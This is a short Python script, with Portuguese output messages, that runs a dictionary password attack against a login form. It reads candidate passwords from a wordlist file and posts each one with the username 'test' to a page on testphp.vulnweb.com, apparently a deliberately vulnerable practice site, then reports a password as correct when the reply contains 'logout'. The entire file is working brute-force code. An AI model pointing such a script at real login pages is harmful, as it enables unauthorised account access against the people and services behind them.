import requests


with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"uname": "test", "pass": word}
        response = requests.post("http://testphp.vulnweb.com/userinfo.php", data = data)
        if "logout" in response.text:
            print("Senha {} correta".format(word))
        else:
            print("Senha {} incorreta".format(word))

